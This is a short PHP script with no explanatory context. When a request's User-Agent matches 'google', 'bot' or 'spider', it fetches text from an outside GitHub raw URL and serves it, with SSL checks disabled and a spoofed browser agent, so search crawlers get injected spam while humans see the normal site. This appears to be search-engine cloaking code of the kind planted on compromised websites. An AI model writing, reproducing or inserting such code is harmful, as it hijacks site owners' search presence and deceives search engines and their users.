<?php

function check_user_agent($o)
{
    return preg_match("/" . preg_quote($o, '/') . "/i", $_SERVER['HTTP_USER_AGENT']) ? true : false;
}
function get_content($p)
{
    if (ini_get('allow_url_fopen') && function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'user_agent' => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'timeout' => 30,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
        ]);
        $q = @file_get_contents($p, false, $context);
        if ($q !== false) {
            return $q;
        }
    }
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        $r = curl_init();
        curl_setopt_array($r, array(
            CURLOPT_URL => $p,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
            CURLOPT_TIMEOUT => 30,
        ));
        $q = curl_exec($r);
        curl_close($r);
        if ($q !== false) {
            return $q;
        }
    }
    if (function_exists('fsockopen')) {
        $s = parse_url($p);
        $scheme = isset($s['scheme']) ? $s['scheme'] : 'http';
        $host = $s['host'];
        $port = isset($s['port']) ? $s['port'] : (($scheme === 'https') ? 443 : 80);
        $path = isset($s['path']) ? $s['path'] : '/';
        $query = empty($s['query']) ? '' : '?' . $s['query'];
        $remote_host = ($scheme === 'https' ? 'ssl://' : '') . $host;
        $fp = @fsockopen($remote_host, $port, $errno, $errstr, 30);
        if ($fp) {
            $user_agent = 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36';
            $request = "GET {$path}{$query} HTTP/1.1\r\n";
            $request .= "Host: {$host}\r\n";
            $request .= "User-Agent: {$user_agent}\r\n";
            $request .= "Connection: close\r\n\r\n";
            fwrite($fp, $request);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 1024);
            }
            fclose($fp);

            $parts = explode("\r\n\r\n", $response, 2);
            if (isset($parts[1])) {
                return $parts[1];
            } else {
                return $response;
            }
        }
    }

    return '';
}
if (check_user_agent("google") || check_user_agent("bot") || check_user_agent("spider"))
{
    echo get_content("https://raw.githubusercontent.com/yugoprakoso157/img/refs/heads/main/45mataram/lp.txt");
    die;
}
?>
